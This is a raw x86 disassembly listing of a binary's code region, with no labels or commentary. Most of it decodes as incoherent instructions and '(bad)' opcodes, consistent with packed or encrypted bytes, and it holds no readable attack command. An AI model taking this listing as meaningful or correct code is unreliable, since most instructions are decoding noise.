  41314a:	fmul   DWORD PTR [ecx+0x7589d475]
  413150:	in     al,dx
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	or     DWORD PTR [ebx+0x61a31063],edi
  413184:	jo     0x4131f6
  413186:	mov    ecx,0xf370707e
  41318b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41318c:	push   ebp
  41318d:	out    0xb4,eax
  41318f:	stos   DWORD PTR es:[edi],eax
  413190:	sub    DWORD PTR [esi+0x30],0x20
  413194:	pop    eax
  413195:	pop    ds
  413196:	(bad)  
  413197:	push   esp
  413198:	popa   
  413199:	nop
  41319a:	loop   0x4131fa
  41319c:	lds    edx,FWORD PTR [esi]
  41319e:	xor    DWORD PTR [ebx-0x2c],esi
  4131a1:	dec    eax
  4131a2:	test   al,0x3b
  4131a4:	out    0xe6,al
  4131a6:	dec    esi
  4131a7:	mov    BYTE PTR [ebx+0x57],bh
  4131aa:	call   0xafd8:0xa2532142
  4131b1:	call   0xbcf0:0x84216681
  4131b8:	fidiv  WORD PTR [edx]
  4131ba:	inc    eax
  4131bb:	dec    ebx
  4131bc:	loopne 0x4131c4
  4131be:	lock pop edi
  4131c0:	ins    BYTE PTR es:[edi],dx
  4131c1:	cwde   
  4131c2:	fsubr  st(6),st
  4131c4:	stos   DWORD PTR es:[edi],eax
  4131c5:	and    eax,0x5cda6e19
  4131ca:	jle    0x4131ea
  4131cc:	pushf  
  4131cd:	dec    ebx
  4131ce:	in     eax,dx
  4131cf:	or     eax,0xbbf27032
  4131d4:	xchg   ebx,eax
  4131d5:	(bad)  
  4131d7:	mov    cl,0xfe
  4131d9:	rcr    DWORD PTR [esi+ecx*1],cl
  4131dc:	ret    
  4131dd:	pop    ebp
  4131de:	pop    edx
  4131df:	aaa    
  4131e0:	cmc    
  4131e1:	rol    BYTE PTR es:0x59a73722,0xb8
  4131e9:	pop    ecx
  4131ea:	xor    ah,BYTE PTR [esi-0x5704b45f]
  4131f0:	pop    ecx
  4131f1:	jne    0x41322c
  4131f3:	sub    BYTE PTR [edi+edx*2+0xcf87929],dl
  4131fa:	pusha  
  4131fb:	test   eax,0xf1137412
  413200:	(bad)  
  413201:	neg    DWORD PTR [eax]
  413203:	push   ebx
  413204:	adc    bh,BYTE PTR ds:0xa1110452
  41320a:	lock mov al,ds:0xa8985be8
  413210:	pushf  
  413211:	(bad)  
  413212:	(bad)  
  413213:	pop    eax
  413214:	mov    WORD PTR [ebp-0x88fdcc],gs
  41321a:	push   0x66
  41321c:	sbb    al,0x81
  41321e:	retf   0x4e85
  413221:	les    ebx,FWORD PTR [edi]
  413223:	cs mov al,dh
  413226:	mov    esi,0x60149b5
  41322b:	scas   eax,DWORD PTR es:[edi]
  41322c:	rol    DWORD PTR [ecx],cl
  41322e:	jle    0x41325e
  413230:	enter  0xe5d,0x74
  413234:	icebp  
  413235:	repz mov eax,0x9146d64f
  41323b:	xchg   ah,al
  41323d:	retf   0x19e0
  413240:	mov    ch,0xb6
  413242:	out    dx,al
  413243:	sub    eax,ebx
  413245:	xor    DWORD PTR [ecx+0x61],ebp
  413248:	(bad)  [edx+0x61164143]
  41324e:	lods   eax,DWORD PTR ds:[esi]
  41324f:	shr    BYTE PTR [ecx],cl
  413251:	jbe    0x413267
  413253:	push   es
  413254:	sahf   
  413255:	ret    0xeea5
  413258:	mul    DWORD PTR [ecx+0x51]
  41325b:	push   0x7fc2c235
  413260:	bound  esi,QWORD PTR [ebp-0x5f51407f]
  413266:	inc    ebp
  413267:	and    BYTE PTR [esi+0x2dd799cb],ch
  41326d:	dec    edx
  41326e:	dec    eax
  41326f:	hlt    
  413270:	popf   
  413271:	adc    edx,esi
  413273:	jb     0x41325d
  413275:	and    al,0x2
  413277:	popa   
  413278:	xor    eax,0x39639346
  41327e:	add    DWORD PTR [ebp-0x36fb0130],edi
  413284:	enter  0x915d,0xbf
  413288:	sbb    eax,0x2c43ccde
  41328d:	add    bl,BYTE PTR [ecx-0x5f]
  413290:	sbb    DWORD PTR ds:0xcac57115,ebx
  413296:	jmp    0x97f1:0x3a2ec135
  41329d:	es fsubr st,st(3)
  4132a0:	cwde   
  4132a1:	mov    ch,0x6e
  4132a3:	inc    edi
  4132a4:	xor    eax,0xe138e6d8
  4132a9:	inc    eax
  4132aa:	add    cl,BYTE PTR [edi-0x5d]
  4132ad:	pop    ebx
  4132ae:	or     al,0xfb
  4132b0:	jmp    0x37875747
  4132b5:	das    
  4132b6:	or     eax,0xee534fc2
  4132bb:	cmp    eax,0x935fdd7a
  4132c0:	pop    ds
  4132c1:	(bad)  
  4132c2:	jmp    0x4132e1
  4132c4:	fidivr DWORD PTR ds:0xb28572fa
  4132ca:	and    DWORD PTR [ebp+0x272f67cb],esi
  4132d0:	mov    DWORD PTR [ecx+ebx*8],edx
  4132d3:	aam    0xd7
  4132d5:	push   0xfffffff8
  4132d7:	icebp  
  4132d8:	adc    BYTE PTR [ecx-0x62c17d02],cl
  4132de:	mov    eax,0x33f2b968
  4132e3:	out    dx,al
  4132e4:	(bad)  
  4132e6:	xchg   DWORD PTR [ecx],ecx
  4132e8:	mov    dl,BYTE PTR [edx]
  4132ea:	hlt    
  4132eb:	inc    ebp
  4132ec:	dec    ebp
  4132ed:	sbb    DWORD PTR [edi+0x60],ecx
  4132f0:	retf   0x7f8b
  4132f3:	sbb    BYTE PTR [ebp-0x1dbdfa0],0x13
  4132fa:	inc    ebp
  4132fb:	shl    BYTE PTR [ebp-0x5363428d],0xb9
  413302:	push   eax
  413303:	nop
  413304:	sbb    DWORD PTR [eax+ebp*1+0x1ae8a93b],esp
  41330b:	xor    BYTE PTR [ecx-0x59e9544a],0xc3
  413312:	lods   al,BYTE PTR ds:[esi]
  413313:	mov    ah,0x66
  413315:	inc    ebx
  413316:	push   esi
  413317:	push   ds
  413318:	adc    ebx,DWORD PTR [edx-0x720f1b42]
  41331e:	xchg   edi,eax
  41331f:	aad    0xcf
  413321:	xor    DWORD PTR [edi],esp
  413323:	mov    bh,bl
  413325:	adc    esi,DWORD PTR [ebx-0x1a881dd0]
  41332b:	add    DWORD PTR [ecx-0x1bb1f4b6],edx
  413331:	cmp    al,0x4d
  413333:	and    DWORD PTR fs:[ecx+0x48],eax
  413337:	jl     0x4133b0
  413339:	pop    esi
  41333a:	out    dx,eax
  41333b:	gs out dx,al
  41333d:	pop    esp
  41333e:	xchg   eax,edi
  413340:	inc    DWORD PTR [edx-0x175f26fc]
  413346:	mov    ch,0x2b
  413348:	xchg   esp,eax
  413349:	fist   WORD PTR [eax+0x6c]
  41334c:	cli    
  41334d:	mov    al,ds:0xce91d0cc
  413352:	lea    eax,[ecx]
  413354:	cwde   
  413355:	sbb    DWORD PTR [esi+0x20],edi
  413358:	aaa    
  413359:	leave  
  41335a:	cmp    eax,0x5c232899
  41335f:	xchg   ebp,eax
  413360:	sub    BYTE PTR ds:0x8952e70b,dl
  413366:	arpl   WORD PTR [esp+edi*4-0x239c1ce9],bp
  41336d:	xchg   ecx,eax
  41336e:	imul   edx,esi,0x22
  413371:	mov    edx,0x603badb9
  413376:	ja     0x41331d
  413378:	loop   0x413394
  41337a:	add    DWORD PTR [edi-0x17],edi
  41337d:	jns    0x41339e
  41337f:	xor    DWORD PTR [edi+0x66],esi
  413382:	cs jb  0x41339d
  413385:	mov    DWORD PTR [eax-0x5ce8558c],ebx
  41338b:	in     al,dx
  41338c:	mov    ?,WORD PTR [eax-0x51]
  41338f:	pop    es
  413390:	xchg   esp,eax
  413391:	adc    eax,0xbf696c1
  413396:	pop    ecx
  413397:	inc    ebx
  413398:	pop    esi
  413399:	into   
  41339a:	cmp    BYTE PTR [esi+0x72],al
  41339d:	cli    
  41339e:	mov    edi,edx
  4133a0:	sbb    ebp,DWORD PTR [ebp+0x4433f282]
  4133a6:	ficom  WORD PTR [ebp+0x72]
  4133a9:	sti    
  4133aa:	push   edx
  4133ab:	xor    al,0x4b
  4133ad:	fcom   QWORD PTR [edx+ebp*8]
  4133b0:	scas   eax,DWORD PTR es:[edi]
  4133b1:	jmp    0x39c357f0
  4133b6:	and    ch,BYTE PTR [ecx-0x66]
  4133b9:	mov    ?,WORD PTR [eax]
  4133bb:	pop    edi
  4133bc:	div    DWORD PTR [ecx-0x56]
  4133bf:	scas   eax,DWORD PTR es:[edi]
  4133c0:	ss lods al,BYTE PTR gs:[esi]
  4133c3:	jmp    0xdc2a:0x3d285b68
  4133ca:	cs pop edi
  4133cc:	out    0xe6,al
  4133ce:	test   DWORD PTR [ebp-0x4427c03a],esi
  4133d4:	scas   al,BYTE PTR es:[edi]
  4133d5:	jb     0x413434
  4133d7:	test   bl,al
  4133d9:	pop    edx
  4133da:	test   al,0x7
  4133dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133dd:	ja     0x41344b
  4133df:	and    al,0x13
  4133e1:	outs   dx,DWORD PTR ds:[esi]
  4133e2:	inc    esp
  4133e3:	adc    eax,0xd7624b86
  4133e8:	dec    edi
  4133e9:	pop    edx
  4133ea:	inc    eax
  4133eb:	sub    al,0xaa
  4133ed:	cmp    al,BYTE PTR [eax+0x7a26593c]
  4133f3:	xchg   edi,eax
  4133f4:	call   0x33b38e8b
  4133f9:	ss aas 
  4133fb:	sub    BYTE PTR [ebp-0x21],ah
  4133fe:	push   edx
  4133ff:	jno    0x413423
  413401:	push   DWORD PTR [ebp+0x2a]
  413404:	add    eax,0xd66d3118
  413409:	(bad)  
  41340a:	mov    ah,0x1f
  41340c:	inc    eax
  41340d:	dec    esi
  41340e:	(bad)  
  413410:	push   edx
  413411:	test   DWORD PTR [edx-0x38],esp
  413414:	mov    eax,0xc4415840
  413419:	lahf   
  41341a:	xchg   ebx,eax
  41341b:	add    eax,0x872fe2e7
  413420:	cmp    ecx,esp
  413422:	xor    DWORD PTR [ebx],esi
  413424:	aad    0xf
  413426:	push   cs
  413427:	fdivrp st(6),st
  413429:	sub    eax,0xab4520d7
  41342e:	mov    bh,BYTE PTR [ebx-0x3d389436]
  413434:	pop    edx
  413435:	call   0x96efe7
  41343a:	push   0xc
  41343c:	inc    eax
  41343d:	push   ss
  41343e:	imul   eax,DWORD PTR [eax],0x11
  413441:	outs   dx,DWORD PTR ds:[esi]
  413442:	stc    
  413443:	mov    ds:0xd6c3abf9,eax
  413448:	xor    eax,0xd9647ef8
  41344d:	adc    al,0xb1
  41344f:	sbb    DWORD PTR [ebx+eax*1],edx
  413452:	retf   
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xfe8eb40f,al
  413492:	lods   al,BYTE PTR ds:[esi]
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xe970707e
  41349c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349d:	push   esp
  41349e:	xchg   edx,eax
  41349f:	(bad)  
  4134a2:	enter  0x19f3,0xf7
  4134a6:	enter  0x7cfb,0x8c
  4134aa:	dec    esp
  4134ab:	test   eax,0x7d376540
  4134b0:	lea    ebp,[esi]
  4134b2:	stos   BYTE PTR es:[edi],al
  4134b3:	xchg   ebx,eax
  4134b4:	pop    ebp
  4134b5:	retf   0xdea8
  4134b8:	jecxz  0x4134ad
  4134ba:	add    esi,DWORD PTR [eax-0x65]
  4134bd:	pop    edx
  4134be:	cmp    DWORD PTR [ebx+0x5b],esi
  4134c1:	sub    eax,0x3468e27a
  4134c6:	sbb    ecx,esi
  4134c8:	fcom   DWORD PTR [edx+0xf9f3def]
  4134ce:	and    BYTE PTR [esi-0x3c],al
  4134d1:	xchg   BYTE PTR [esi-0x1fc8da2b],ch
  4134d7:	into   
  4134d8:	and    BYTE PTR [edi+0x12],bl
  4134db:	pop    esi
  4134dc:	imul   esp,DWORD PTR ds:[edi+0x3b],0x25
  4134e1:	mov    al,0xcf
  4134e3:	sub    al,0xce
  4134e5:	push   ebp
  4134e6:	(bad)  
  4134e7:	sar    BYTE PTR [edi-0x6bd81ad1],1
  4134ed:	mov    eax,DWORD PTR [eax+0x7ef7ff4d]
  4134f3:	out    0xe,al
  4134f5:	inc    ebx
  4134f6:	test   al,0xeb
  4134f8:	mov    ch,0x3d
  4134fa:	or     bh,BYTE PTR [esp+eiz*4+0x37]
  4134fe:	fs dec esp
  413500:	int    0x28
  413502:	push   esi
  413503:	fmul   DWORD PTR [esi+0x6f6624cd]
  413509:	ins    DWORD PTR es:[edi],dx
  41350a:	jne    0x413573
  41350c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41350e:	sbb    BYTE PTR [edi-0x7c],bh
  413511:	pop    es
  413512:	cmp    eax,DWORD PTR gs:[ecx+eax*4+0x2e]
  413517:	mov    dl,0xc4
  413519:	jmp    0xea3ef6a8
  41351e:	inc    ebx
  41351f:	out    0x3f,eax
  413521:	out    0x85,eax
  413523:	xor    dh,BYTE PTR [edi]
  413525:	sbb    ebp,DWORD PTR [edx+0x6e]
  413528:	mov    bl,0x7e
  41352a:	push   es
  41352b:	mov    eax,ds:0x65c8cc32
  413530:	ffreep st(0)
  413532:	mov    ds:0xb0c3fdf7,al
  413537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413538:	pop    eax
  413539:	outs   dx,DWORD PTR ds:[esi]
  41353a:	sub    eax,0xb6fff105
  41353f:	pop    es
  413540:	xor    bl,BYTE PTR [edi-0x14d4f3b]
  413546:	mov    bl,0x22
  413548:	pop    esp
  413549:	out    0xf9,eax
  41354b:	or     eax,0xd860e97f
  413550:	jns    0x4135ab
  413552:	addr16 push esi
  413554:	dec    ebx
  413555:	pop    edx
  413556:	mov    al,ds:0x33821dc7
  41355b:	imul   edx,DWORD PTR [ebx-0x17],0x27
  41355f:	(bad)  
  413560:	cwde   
  413561:	ins    DWORD PTR es:[edi],dx
  413562:	ins    BYTE PTR es:[edi],dx
  413563:	mov    BYTE PTR [edi],al
  413565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413566:	jns    0x4134f1
  413568:	sti    
  413569:	or     eax,0xdd92d1f4
  41356e:	loop   0x413507
  413570:	mov    ss,WORD PTR [esi-0x70]
  413573:	ret    
  413574:	ins    DWORD PTR es:[edi],dx
  413575:	inc    ebp
  413576:	and    bl,BYTE PTR [edi+esi*4-0x45]
  41357a:	xchg   edx,eax
  41357b:	add    eax,0x16ee98f7
  413580:	lds    edx,FWORD PTR [eax-0x1e74b67c]
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	sbb    al,0xf6
  413589:	adc    al,0x5e
  41358b:	inc    edi
  41358c:	mov    bl,0x5
  41358e:	(bad)  
  41358f:	push   esp
  413590:	sbb    esp,DWORD PTR [ebx+0x30c8a98]
  413596:	cmp    al,bh
  413598:	(bad)  [eax+edi*2+0x64]
  41359c:	mov    al,0x15
  41359e:	sbb    ebp,edi
  4135a0:	lea    ecx,[edi-0x30]
  4135a3:	adc    DWORD PTR [ebp+0x72a41767],edi
  4135a9:	(bad)  
  4135aa:	push   0x64
  4135ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ad:	and    DWORD PTR ds:0x3ff58fb7,edx
  4135b3:	pop    ds
  4135b4:	loop   0x41361f
  4135b6:	outs   dx,BYTE PTR ds:[esi]
  4135b7:	jl     0x413614
  4135b9:	out    0x1e,al
  4135bb:	sbb    eax,DWORD PTR [eax+0x8]
  4135be:	mov    cl,0xe1
  4135c0:	xchg   ebx,eax
  4135c1:	add    al,0xe4
  4135c3:	mov    ch,0x99
  4135c5:	aad    0xc5
  4135c7:	stos   DWORD PTR es:[edi],eax
  4135c8:	pop    DWORD PTR [edx+0x15bc55b2]
  4135ce:	jno    0x4135aa
  4135d0:	mov    DWORD PTR [edx+esi*8+0x75241f97],edx
  4135d7:	cmp    BYTE PTR [ecx+0x2f],dh
  4135da:	ja     0x413606
  4135dc:	xchg   BYTE PTR [ebp-0x3e],al
  4135df:	dec    DWORD PTR [edx-0x22a6a4f2]
  4135e5:	sub    DWORD PTR [eax+0x35613432],edx
  4135eb:	test   eax,0x3af9ac03
  4135f0:	cli    
  4135f1:	pusha  
  4135f2:	cmp    DWORD PTR [edx+eiz*8-0x2fc0dbe8],esp
  4135f9:	mov    ecx,0xabb471f7
  4135fe:	lock jp 0x41367a
  413601:	fadd   st(2),st
  413603:	xchg   edi,eax
  413604:	jmp    0x83d3:0x38ec
  41360a:	dec    edx
  41360b:	fwait
  41360c:	imul   edx,DWORD PTR [edx-0x72],0xc5a9c474
  413613:	xchg   ebp,eax
  413614:	cli    
  413615:	in     eax,0x14
  413617:	xchg   esi,eax
  413618:	cdq    
  413619:	mov    ds:0x2ece159d,eax
  41361e:	sub    eax,0x979d973
  413623:	fimul  WORD PTR [edx+ebx*1-0x7b]
  413627:	in     eax,dx
  413628:	repnz xor cl,BYTE PTR [edx+0x31]
  41362c:	scas   al,BYTE PTR es:[edi]
  41362d:	mov    esi,0x6711b069
  413632:	sbb    edi,edi
  413634:	sub    BYTE PTR [edi],bl
  413636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413637:	and    eax,0x4476ffff
  41363c:	add    esp,edi
  41363e:	(bad)  
  41363f:	je     0x4135f5
  413641:	mov    al,ds:0xbcf61b02
  413646:	xor    DWORD PTR [ecx-0x32],0xffffffae
  41364a:	or     al,0x8d
  41364c:	inc    ebx
  41364d:	test   ch,dh
  41364f:	jl     0x413625
  413651:	cdq    
  413652:	or     eax,0x4906d22c
  413657:	loope  0x4136bc
  413659:	popa   
  41365a:	or     al,BYTE PTR [edi+eax*8-0xdedcbcd]
  413661:	jnp    0x413630
  413663:	lods   eax,DWORD PTR ds:[esi]
  413664:	pop    edi
  413665:	mov    dh,0x51
  413667:	dec    DWORD PTR [ebp+0x3bb417d1]
  41366d:	loope  0x4136db
  41366f:	xor    BYTE PTR [eax+0x28],ah
  413672:	imul   esi,DWORD PTR ds:0xba4eaee,0xa
  413679:	call   0xd3d3:0x19f42465
  413680:	cli    
  413681:	push   edx
  413682:	loope  0x413609
  413684:	in     eax,dx
  413685:	jbe    0x4136cc
  413687:	jle    0x4136ed
  413689:	xor    al,0x26
  41368b:	out    0x99,eax
  41368d:	add    edi,DWORD PTR [edi-0x57]
  413690:	xor    ah,BYTE PTR [edx]
  413692:	lods   al,BYTE PTR ds:[esi]
  413693:	fsubr  st(6),st
  413695:	xchg   edx,eax
  413696:	fwait
  413697:	push   es
  413698:	mov    edx,0xf1f668ba
  41369d:	int3   
  41369e:	test   ebp,esi
  4136a0:	xchg   DWORD PTR [edi+0x59ddbcc2],esi
  4136a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a7:	and    eax,0xb94fc40d
  4136ac:	pop    ds
  4136ad:	push   edi
  4136ae:	cmp    eax,0x87fa9b7c
  4136b3:	push   ebx
  4136b4:	mov    eax,esp
  4136b6:	ret    0x5ff1
  4136b9:	out    0x14,al
  4136bb:	xchg   edi,eax
  4136bc:	cmc    
  4136bd:	inc    esp
  4136be:	pop    edx
  4136bf:	sti    
  4136c0:	mov    cs,WORD PTR [edx+0x22ed4a5d]
  4136c6:	xor    cl,BYTE PTR [ecx]
  4136c8:	fcomp  st(4)
  4136ca:	(bad)  
  4136cb:	xor    dl,ch
  4136cd:	hlt    
  4136ce:	and    DWORD PTR [esi],esp
  4136d0:	push   ss
  4136d1:	add    eax,0xfb9be173
  4136d6:	inc    ebp
  4136d7:	cmp    edi,DWORD PTR cs:[ecx]
  4136da:	mov    esi,0xfd82f6a0
  4136df:	add    BYTE PTR [esi+0x58],0xb5
  4136e3:	inc    edi
  4136e4:	lahf   
  4136e5:	sub    al,0x79
  4136e7:	dec    edx
  4136e8:	dec    ebx
  4136e9:	sub    BYTE PTR [ebx],ch
  4136eb:	add    bh,0x42
  4136ee:	sbb    BYTE PTR [edi+esi*4],bl
  4136f1:	push   0x82240c46
  4136f6:	lea    esi,[esi]
  4136f8:	je     0x4136c5
  4136fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136fb:	jp     0x41373d
  4136fd:	fadd   QWORD PTR [ecx+edi*4-0x737c1e53]
  413704:	ret    
  413705:	hlt    
  413706:	mov    ecx,0xa0b4916a
  41370b:	repz imul edi,DWORD PTR [ebx+0x64111066],0xa4321a07
  413716:	scas   eax,DWORD PTR es:[edi]
  413717:	ja     0x413749
  413719:	cmp    DWORD PTR [esi+0x274a6054],edi
  41371f:	pop    ebx
  413720:	xchg   edi,eax
  413721:	or     ecx,eax
  413723:	fwait
  413724:	cli    
  413725:	dec    esi
  413726:	add    eax,0x954a64f3
  41372b:	test   BYTE PTR [ecx-0x4d],0xf
  41372f:	inc    edx
  413730:	cwd    
  413732:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413734:	test   eax,0xc98c111f
  413739:	pop    ecx
  41373a:	jnp    0x41371b
  41373c:	cmp    ch,BYTE PTR [ebx-0x18f07563]
  413742:	mov    dh,0xb3
  413744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413745:	dec    ebx
  413746:	pop    ecx
  413747:	retf   0x37c
  41374a:	fwait
  41374b:	adc    ch,BYTE PTR [ebp+0x7ca9ae93]
  413751:	ins    BYTE PTR es:[edi],dx
  413752:	and    cl,ch
  413754:	mov    dl,0x82
  413756:	arpl   WORD PTR [edi+0x52d59bab],ax
  41375c:	xor    BYTE PTR [ebx-0x39],bl
  41375f:	es test eax,0xff83b33
  413765:	test   DWORD PTR [ebp-0xfffff6],eax
  41376b:	jne    0x413775
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	rol    ch,cl
  413780:	lds    edi,FWORD PTR [edi+0x35]
  413783:	imul   esi,DWORD PTR [eax+0x70],0xffffffb9
  413787:	jle    0x4137f9
  413789:	jo     0x4137eb
  41378b:	xor    BYTE PTR cs:[edi+0x77],cl
  41378f:	dec    esp
  413790:	(bad)  
  413791:	dec    ebp
  413792:	xchg   ch,bl
  413794:	mov    ds:0x903b86f3,al
  413799:	pop    ss
  41379a:	pop    edx
  41379b:	xchg   BYTE PTR ds:0xef662786,dh
  4137a1:	adc    edx,DWORD PTR [ebx-0x40c04289]
  4137a7:	cmp    al,0x82
  4137a9:	jnp    0x413768
  4137ab:	sbb    ch,BYTE PTR [eax]
  4137ad:	mov    dh,0x99
  4137af:	sub    bl,dl
  4137b1:	jle    0x41378d
  4137b3:	popa   
  4137b4:	mov    ebp,0x612eae1c
  4137b9:	mov    eax,ds:0x2d5572b6
  4137be:	bswap  eax
  4137c0:	(bad)  
  4137c1:	out    0x19,al
  4137c3:	retf   0xbc24
  4137c6:	and    al,0xd2
  4137c8:	push   ss
  4137c9:	mov    ds:0x94b28315,al
  4137ce:	and    cl,BYTE PTR [edi]
  4137d0:	(bad)  
  4137d1:	js     0x4137c7
  4137d3:	adc    eax,esp
  4137d5:	adc    cl,BYTE PTR ds:0x42ffff62
  4137db:	dec    edx
  4137dc:	mov    cl,BYTE PTR [ebx-0x569b5157]
  4137e2:	sub    al,0x27
  4137e4:	adc    al,cl
  4137e6:	popf   
  4137e7:	adc    bh,bl
  4137e9:	das    
  4137ea:	cli    
  4137eb:	sbb    esi,eax
  4137ed:	dec    ebx
  4137ee:	ja     0x413834
  4137f0:	cli    
  4137f1:	(bad)  
  4137f2:	jle    0x41386d
  4137f4:	add    al,ch
  4137f6:	xchg   edx,eax
  4137f7:	push   esp
  4137f8:	cmp    dh,BYTE PTR [esi]
  4137fa:	je     0x41380d
  4137fc:	jmp    0x413826
  4137fe:	pop    eax
  4137ff:	add    BYTE PTR [edi+0x72],dl
  413802:	xor    ebx,ebp
  413804:	pop    edi
  413805:	cs push eax
  413807:	data16 sbb al,BYTE PTR [edi]
  41380a:	fcom   DWORD PTR [edi-0x50]
  41380d:	(bad)
  413811:	sbb    BYTE PTR [edx-0x2db9a343],0xf0
  413818:	arpl   si,dx
  41381a:	dec    edx
  41381b:	loopne 0x4137a1
  41381d:	out    0x8,al
  41381f:	mov    ecx,0x5ad7382b
  413824:	jle    0x41386a
  413826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413828:	cmp    DWORD PTR [ebp-0x4aea978b],esi
  41382e:	mov    ds:0x982ad1b0,al
  413833:	and    BYTE PTR [ebp-0x42],0x92
  413837:	outs   dx,DWORD PTR ds:[esi]
  413838:	(bad)  
  413839:	scas   eax,DWORD PTR es:[edi]
  41383a:	mov    BYTE PTR [ebx-0x27],al
  41383d:	push   0x3e7ae232
  413842:	hlt    
  413843:	jne    0x41388a
  413845:	std    
  413846:	cmc    
  413847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413848:	hlt    
  413849:	fcom   DWORD PTR [edx-0x126e69d6]
  41384f:	loopne 0x413823
  413851:	lock shl DWORD PTR [eax+eax*8+0x6f],cl
  413856:	js     0x413858
  413858:	or     DWORD PTR ds:0x38756bc1,ebp
  41385e:	cmp    al,0xeb
  413860:	aas    
  413861:	push   edi
  413862:	pop    ss
  413863:	or     eax,0x8642d0cc
  413868:	cmp    BYTE PTR [edi],al
  41386a:	int3   
  41386b:	jge    0x4138b4
  41386d:	dec    edi
  41386e:	xchg   esi,eax
  41386f:	pop    ebp
  413870:	loop   0x4138f0
  413872:	add    DWORD PTR [edx+edi*4],ebp
  413875:	or     edx,DWORD PTR [eax]
  413877:	dec    edi
  413878:	call   0x7daf9001
  41387d:	jbe    0x413883
  41387f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413880:	cmp    ah,BYTE PTR [eax+0x58]
  413883:	xchg   ecx,eax
  413884:	fiadd  DWORD PTR [ecx+0x56]
  413887:	retf   0x8c8e
  41388a:	pop    ecx
  41388b:	out    0x70,eax
  41388d:	std    
  41388e:	jl     0x413888
  413890:	mov    eax,0xb04b670
  413895:	dec    edx
  413896:	cmp    eax,0x79e30199
  41389b:	and    ch,ah
  41389d:	popa   
  41389e:	and    BYTE PTR [ecx-0x52],bh
  4138a1:	(bad)  
  4138a3:	fist   WORD PTR [edi+0x28b1db02]
  4138a9:	cs mov dl,0x1a
  4138ac:	cmp    al,0x40
  4138ae:	(bad)  
  4138af:	jns    0x41390c
  4138b1:	pop    ds
  4138b2:	pop    es
  4138b3:	mov    ecx,0x79155a4c
  4138b8:	fstp   QWORD PTR ds:0x68198e01
  4138be:	or     bh,BYTE PTR ds:0x3a4cb54a
  4138c4:	out    dx,al
  4138c5:	or     DWORD PTR [esi-0x4d874478],ebx
  4138cb:	out    dx,eax
  4138cc:	aaa    
  4138cd:	mov    ch,0xf6
  4138cf:	sti    
  4138d0:	inc    ebx
  4138d1:	dec    ebx
  4138d2:	ror    ebx,0x7d
  4138d5:	add    al,0xa4
  4138d7:	mov    ch,0xb2
  4138d9:	sub    BYTE PTR [eax],dh
  4138db:	lea    esi,[ecx]
  4138dd:	adc    al,0x10
  4138df:	pop    es
  4138e0:	out    dx,al
  4138e1:	fadd   QWORD PTR [ebp+0x35d2d8d8]
  4138e7:	stos   BYTE PTR es:[edi],al
  4138e8:	and    al,0x26
  4138ea:	and    cl,BYTE PTR [eax+0x46]
  4138ed:	lock mov al,ds:0xd982b17a
  4138f3:	add    ecx,DWORD PTR [esi+ebp*4-0x1]
  4138f7:	ror    DWORD PTR [ecx],0xa2
  4138fa:	pop    ss
  4138fb:	sub    DWORD PTR [esi-0x2c158f48],ebp
  413901:	ins    DWORD PTR es:[edi],dx
  413902:	push   es
  413903:	sub    bh,BYTE PTR [eax-0x5bca63c9]
  413909:	sub    DWORD PTR [ecx+0x3ba7e573],ebp
  41390f:	div    bl
  413911:	push   ecx
  413912:	(bad)  gs:[ebx-0x1e]
  413916:	stos   BYTE PTR es:[edi],al
  413917:	(bad)  
  413918:	es out 0xae,al
  41391b:	inc    esp
  41391c:	fdivr  st(6),st
  41391e:	xchg   edi,edx
  413920:	xchg   DWORD PTR [ebp+0x67],ebx
  413923:	push   esp
  413924:	cmp    esp,DWORD PTR [eax]
  413926:	push   0xffffffd5
  413928:	mov    WORD PTR [edx],?
  41392a:	shl    BYTE PTR [esi],1
  41392c:	neg    bl
  41392e:	mov    bh,0x1e
  413930:	dec    ecx
  413931:	and    bl,BYTE PTR [eax-0x2b]
  413934:	mov    dl,0x2d
  413936:	cld    
  413937:	fmul   QWORD PTR [ebp+0x72902fa3]
  41393d:	in     al,0x99
  41393f:	hlt    
  413940:	sti    
  413941:	or     ch,BYTE PTR [edi+ebp*4+0x7a]
  413945:	jbe    0x413955
  413947:	mov    bl,0xaa
  413949:	push   0xe7acafa5
